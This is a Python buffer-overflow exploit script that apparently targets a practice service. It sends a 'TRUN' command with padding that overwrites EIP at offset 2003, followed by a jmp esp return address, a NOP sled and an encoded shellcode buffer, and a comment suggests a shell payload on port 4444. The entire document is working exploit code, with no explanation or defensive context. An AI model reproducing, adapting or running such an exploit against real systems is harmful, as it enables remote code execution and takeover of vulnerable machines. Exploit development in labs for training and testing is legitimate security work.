#!/usr/bin/env python3

import socket
import struct

#to detect 
#all_characters = b"".join([ struct.pack('<B',x)for x in range(1,256) ])

s = socket.socket()
s.connect(("192.168.1.93", 9999)) #target
total_length = 2988
offset = 2003 # eip
new_eip = struct.pack("<I", 0x62501203) # jmp esp
nop_sled = b"\x90" * 16
buf =  b""
buf += b"\xdd\xc1\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1\x59\xbe\xbc"
buf += b"\x08\xd8\xbe\x83\xea\xfc\x31\x72\x15\x03\x72\x15\x5e"
buf += b"\xfd\x24\x56\x11\xfe\xd4\xa7\x4d\xce\x06\x2e\x68\x54"
buf += b"\x2c\x63\x42\x1e\x60\x88\x29\x72\x91\xa1\xd2\x7c\x2e"
buf += b"\x8b\x0a\x08\x22\x24\x63\xce\x6f\x08\xe2\xb2\x6d\x5d"
buf += b"\xc4\x8b\xbd\x90\x05\xcb\x0b\xde\xea\x81\xdc\xab\xa6"
buf += b"\x35\x68\xe9\x7a\x37\xbe\x65\xc2\x4f\xbb\xba\xb6\xe3"
buf += b"\xc2\xea\xbd\xa4\xe4\x0b\x12\x04\x6e\x43\x8c\x20\xb9"
buf += b"\x20\x90\x63\xb1\xfd\x63\x42\x3a\xfc\xa5\x94\x04\x3e"
buf += b"\x86\xda\x28\xc0\xdf\xdd\xd0\xb6\x2b\x1e\x6c\xc1\xe8"
buf += b"\x5c\xaa\x44\xee\xc7\x39\xfe\xca\xf6\xee\x99\x99\xf5"
buf += b"\x5b\xed\xc5\x19\x5d\x22\x7e\x25\xd6\xc5\x50\xaf\xac"
buf += b"\xe1\x74\xeb\x77\x8b\x2d\x51\xd9\xb4\x2d\x3d\x86\x10"
buf += b"\x26\xac\xd1\x25\xc7\x2e\xde\x7b\x5f\xe2\x13\x84\x9f"
buf += b"\x6c\x23\xf7\xad\x33\x9f\x9f\x9d\xbc\x39\x67\x94\xab"
buf += b"\xb9\xb7\x1e\xbb\x47\x38\x5e\x95\x83\x6c\x0e\x8d\x22"
buf += b"\x0d\xc5\x4d\xca\xd8\x73\x44\x5c\x23\x2b\x59\xf9\xcb"
buf += b"\x29\x5a\x10\x50\xa4\xbc\x42\x38\xe6\x10\x23\xe8\x46"
buf += b"\xc1\xcb\xe2\x49\x3e\xeb\x0c\x80\x57\x86\xe2\x7c\x0f"
buf += b"\x3f\x9a\x25\xdb\xde\x63\xf0\xa1\xe1\xe8\xf0\x56\xaf"
buf += b"\x18\x71\x45\xd8\x7e\x79\x95\x19\xeb\x79\xff\x1d\xbd"
buf += b"\x2e\x97\x1f\x98\x18\x38\xdf\xcf\x1b\x3f\x1f\x8e\x2d"
buf += b"\x4b\x16\x04\x11\x23\x57\xc8\x91\xb3\x01\x82\x91\xdb"
buf += b"\xf5\xf6\xc2\xfe\xf9\x22\x77\x53\x6c\xcd\x21\x07\x27"
buf += b"\xa5\xcf\x7e\x0f\x6a\x30\x55\x13\x6d\xce\x2b\x3c\xd6"
buf += b"\xa6\xd3\x7c\xe6\x36\xbe\x7c\xb6\x5e\x35\x52\x39\xae"
buf += b"\xb6\x79\x12\xa6\x3d\xec\xd0\x57\x41\x25\xb4\xc9\x42"
buf += b"\xca\x6d\xfa\x39\xa3\x92\xfb\xbd\xad\xf6\xfc\xbd\xd1"
buf += b"\x08\xc1\x6b\xe8\x7e\x04\xa8\x4f\x70\x33\x8d\xe6\x1b"
buf += b"\x3b\x81\xf9\x09"
shell = buf
#payload set 4444 Box:1.93
payload = [
        b"TRUN /.:/",
        b"A"* offset, #eip register
        new_eip,
        nop_sled,
        shell,
        b"C"*( total_length - offset - len(new_eip) - len(nop_sled) - len(shell))
]

payload = b"".join(payload)

s.send(payload)


s.close()
